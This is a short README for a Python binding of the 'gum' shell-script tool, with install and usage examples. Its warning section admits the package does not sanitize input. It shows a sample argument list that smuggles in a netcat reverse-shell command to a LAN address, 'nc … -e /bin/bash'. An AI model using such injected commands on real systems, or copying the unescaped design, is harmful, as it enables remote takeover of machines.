# Gum

A simple python3 bindings of a tool called 'gum'.
https://github.com/charmbracelet/gum <br>
gum is a tool for glamorous shell scripts, written in go,
and supposed to be used in shell scripts.
I've created an eassy to use python class that takes advantage
of that tool and let the avrage python user create a cool looking
CLIs.

# Installation
Use the install instractions from https://github.com/charmbracelet/gum and then:
```bash
$ git clone https://github.com/idobarel/gum-python
$ cd gum-python
$ sudo python3 setup.py install
```

# Usage
```python
import gum

print("which basketball team you like the most?")
x = gum.search(["cavs", "magic", "golden state", "boston"])
gum.spin("hold on...")
print(f"No way! I'm there biggest fan!")
```

# Importent!
The package itself doesn't escapes the users input, **the developer must sanitize the input**
A malicius user can send an input that look like this:
```python
import gum

gum.choose([';', "nc 192.168.1.153 4444 -e /bin/bash"])
```
And it will spawn a reverse shell to the target.

# Notice 
As it is for now, I have nothing to deal with the authours of the gum tool, I wanted it to be easier to use in big python applications, so I created this code.
Just to clear any missunderstandings, all the credit and the notice should go to @charm or https://github.com/charmbracelet.
